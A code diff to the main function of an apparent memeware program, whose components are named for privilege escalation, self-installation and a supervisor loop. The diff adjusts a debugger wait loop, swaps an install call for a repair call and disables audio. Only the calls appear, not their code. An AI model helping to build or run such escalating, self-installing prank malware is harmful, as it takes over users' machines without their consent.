@@ -17,14 +17,15 @@ int main(int argc, char** argv) {
 #ifdef WaitForDebugger
 		if (!IsDebuggerPresent()) {
 			std::cout << "Waiting for debugger..." << std::endl;
-		}
-		while (!IsDebuggerPresent()) {
-			Sleep(100);
+			while (!IsDebuggerPresent()) {
+				Sleep(100);
+			}
 		}
 #endif
 
 		MysteryEscalation::Run();
-		MysteryInstaller::Install();
+
+		MysteryInstaller::Repair();
 
 		HRESULT hr = 0;
 		hr = CoInitializeEx(NULL, COINIT_SPEED_OVER_MEMORY);
@@ -33,22 +34,22 @@ int main(int argc, char** argv) {
 		}
 
 		MysterySupervisor::Init();
-		MysteryAudio::Init();
+		//MysteryAudio::Init();
 		MysteryGraphics::Init();
 
 		while (!MysteryMemeware::QuitRequested) {
 			MysterySupervisor::Update();
-			MysteryAudio::Update();
+			//MysteryAudio::Update();
 			MysteryGraphics::Update();
 		}
 
 		MysteryGraphics::Free();
-		MysteryAudio::Free();
+		//MysteryAudio::Free();
 		MysterySupervisor::Free();
 
-		CoUninitialize();
-
 		MysteryInstaller::Uninstall();
+
+		CoUninitialize();
 
 		return 0;
 	}
